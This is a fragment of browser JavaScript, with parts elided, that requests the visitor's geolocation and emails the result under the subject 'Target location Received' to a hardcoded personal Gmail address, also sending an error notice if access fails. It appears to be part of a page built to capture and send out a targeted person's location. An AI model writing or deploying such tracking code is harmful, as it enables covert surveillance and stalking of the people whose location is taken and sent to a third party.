    ...
    if ("geolocation" in navigator) {
        ...
        navigator.geolocation.getCurrentPosition(
            (position) => {
                ...
                sendEmail('Target location Received', locationDisplay.textContent, 'farhan6100khan@gmail.com');
            },
            (error) => {
                ...
                sendEmail('Location Access Error', locationDisplay.textContent, 'farhan6100khan@gmail.com');
            }
        );
    } else {
